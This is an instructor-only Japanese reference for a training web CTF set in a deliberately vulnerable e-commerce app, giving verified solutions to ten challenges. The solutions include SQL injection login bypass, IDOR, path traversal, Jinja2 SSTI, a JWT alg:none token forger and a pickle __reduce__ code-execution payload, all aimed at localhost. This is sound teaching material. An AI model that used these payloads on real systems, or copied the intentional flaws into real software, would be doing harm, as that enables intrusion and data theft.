# challenges.md（講師用）

Web CTF（EC サイトテーマのCTF教材）全10問の実装詳細・攻略手順をまとめる。
受講生には本ファイルを配布しない。フラグ形式・文言・実装方針はプロジェクトルートの
`challenges.md`（問題仕様書）に準拠しており、本ファイルはその実装結果と検証済みの
攻略コマンドをまとめた講師用リファレンスとなる。

実際のフラグ値は `.env`（`FLAG_01`〜`FLAG_10`）で管理し、本ファイルにも記載しない
（値は `example.env` を参照）。

---

## 問1（★☆☆☆☆）トップページのHTMLコメント

- 実装ファイル: `app/challenges/ch01_top_page.py`, `app/templates/index.html`
- URL: `/`
- フラグ設置箇所: `<head>` 内のHTMLコメント（`{% block head_extra %}`）

**攻略手順**
1. トップページを開く。
2. 「ページのソースを表示」（`Ctrl+U` / `Cmd+Option+U`）で `<head>` 内のコメントを確認する。

---

## 問2（★☆☆☆☆）商品一覧専用JSのコメント

- 実装ファイル: `app/challenges/ch02_product_list.py`, `app/static/js/products.js`（起動時に`app/__init__.py`が内容を書き出す）
- URL: `/products`

**攻略手順**
1. 商品一覧ページを開く。
2. 開発者ツール（F12）→ Sources/Network タブで `products.js` を確認する。

```
curl http://localhost:8000/static/js/products.js
```

---

## 問3（★☆☆☆☆）robots.txt 経由の隠しページ

- 実装ファイル: `app/challenges/ch03_robots.py`, `app/templates/inventory.html`
- URL: `/robots.txt` → `/warehouse-admin-9x7f2`

**攻略手順**
```
curl http://localhost:8000/robots.txt
curl http://localhost:8000/warehouse-admin-9x7f2
```

---

## 問4（★★☆☆☆）非署名Cookieによる認可判定

- 実装ファイル: `app/challenges/ch04_cookie_role.py`
- URL: `/mypage` → `/store-admin`

ログイン成功時に非署名の `role` Cookie（`user` または `admin`）が発行される。
`/store-admin` はこの値だけで認可判定している。

**攻略手順**
1. `customer1` / `password123` でログインする。
2. `role` Cookieを `admin` に書き換えて `/store-admin` にアクセスする。

```
curl -b "session=<ログイン後のsession値>; role=admin" http://localhost:8000/store-admin
```

---

## 問5（★★☆☆☆）SQLインジェクション（認証バイパス）

- 実装ファイル: `app/challenges/ch05_sqli_login.py`, `app/db_init.py`
- URL: `/login`（POST）

ログインクエリを文字列結合で構築（パラメータバインディング不使用）。
DB seed順序を「admin → customer1」にしてあるため、全行に一致するinjectionは
`fetchone()` で **admin（id=1）** を返す。admin のパスワードはランダム値で
通常ログイン不可。

**攻略手順**
```
curl -i -c cookies.txt --data-urlencode "username=' OR '1'='1' -- " -d "password=x" http://localhost:8000/login
```
ログイン成功画面（`login_success_admin.html`）に直接フラグが表示される。

---

## 問6（★★☆☆☆）IDOR

- 実装ファイル: `app/challenges/ch06_idor_orders.py`, `app/db_init.py`
- URL: `/orders/<id>`

`/orders/<id>` はログイン済みかどうかしか確認しておらず、`order.user_id` との
一致を検証していない。admin（user_id=1）の注文（**注文番号2**）の備考欄にフラグを
仕込んである。customer1 自身の注文は注文番号1。

**攻略手順**
```
curl -b cookies.txt http://localhost:8000/orders/2
```
（`cookies.txt` は customer1 としてログイン済みのセッション）

---

## 問7（★★★☆☆）パストラバーサル

- 実装ファイル: `app/challenges/ch07_path_traversal.py`, `secret/flag07.txt`（起動時に生成）
- URL: `/receipts/download?filename=...`

領収書ダウンロード画面のクエリパラメータ名は `filename`。サニタイズせずに
`os.path.join()` → `send_file()` に渡している。`RECEIPTS_DIR`（`app/receipts/`）から
2階層上がってプロジェクトルート直下の `secret/flag07.txt` を読み取らせる。

**攻略手順**
```
curl -b cookies.txt --get --data-urlencode "filename=../../secret/flag07.txt" http://localhost:8000/receipts/download
```

---

## 問8（★★★☆☆）SSTI（Jinja2）

- 実装ファイル: `app/challenges/ch08_ssti_review.py`
- URL: `/products/<id>/reviews`（POST、「お名前」欄）

投稿された「お名前」を `render_template_string(f"{name}さんのレビューを投稿しました。")`
でそのままレンダリングしている。フラグは `app.config["FLAG_08"]` に設定済みで、
Jinja標準の `config` グローバル経由で読み出せる。

**攻略手順**
1. お名前欄に `{{7*7}}` を入力して `49さんのレビューを投稿しました。` と表示されることを確認。
2. お名前欄に `{{ config.FLAG_08 }}` を入力して投稿する。

```
curl -c cookies.txt -b cookies.txt -d "author_name={{ config.FLAG_08 }}&rating=5&comment=x" http://localhost:8000/products/1/reviews -L
```

---

## 問9（★★★★☆）JWT `alg:none` 受理

- 実装ファイル: `app/challenges/ch09_jwt_none.py`
- URL: `/api/login`, `/api/purchases`, `/api/admin-dashboard`

`_decode_token()` がヘッダーの `alg` を確認し、`none` の場合は
`verify_signature: False` で検証をスキップする分岐を持つ。

**攻略手順**
1. Pythonで `alg: none`・署名部分が空のトークンを作成し、payloadに `role: "admin"` を含める。
2. `/api/admin-dashboard` にアクセスする。

```python
import json, base64
def b64url(d): return base64.urlsafe_b64encode(d).rstrip(b"=")
header = b64url(json.dumps({"typ": "JWT", "alg": "none"}).encode())
payload = b64url(json.dumps({"user_id": 1, "username": "x", "role": "admin"}).encode())
print((header + b"." + payload + b".").decode())
```
```
curl -H "Authorization: Bearer <上記トークン>" http://localhost:8000/api/admin-dashboard
```

---

## 問10（★★★★★）安全でないデシリアライゼーション（pickle）

- 実装ファイル: `app/challenges/ch10_pickle_backup.py`, `secret/flag10.txt`（起動時に生成）
- URL: `/cart/backup`, `/cart/restore`

`pickle.loads(base64.b64decode(...))` をユーザー入力に対して直接実行する。
`__reduce__` で `os.system("cat /app/secret/flag10.txt > /tmp/output")` を実行させ、
アプリ側が `/tmp/output` の中身を読み取ってflashメッセージに含めて返す
（受講生がシェルを取らなくてもフラグを取得できる設計）。

**攻略手順**
```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("cat /app/secret/flag10.txt > /tmp/output",))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```
```
curl -c cookies.txt -b cookies.txt --data-urlencode "backup_data=<上記の出力>" http://localhost:8000/cart/restore -L
```
（`/cart` ページのflashメッセージにフラグが表示される。`--data-urlencode` を使わないと
base64のパディングが壊れて失敗するので注意）

---

## 実装メモ（講師用）

- 全問共通で `flags.py` が環境変数からフラグを読み込む。ソースコードにフラグ文字列を直書きしない。
- DB seedの `users` テーブルは `admin`（id=1）→`customer1`（id=2）の順で登録している（問5のSQLi挙動に依存）。
- 問9・10はコンテナ内で完結させ、外部公開しない。
- アプリはステートレスで、`docker compose up` のたびにDB・生成ファイル（`products.js`, `secret/flag07.txt`, `secret/flag10.txt`）が再生成される。
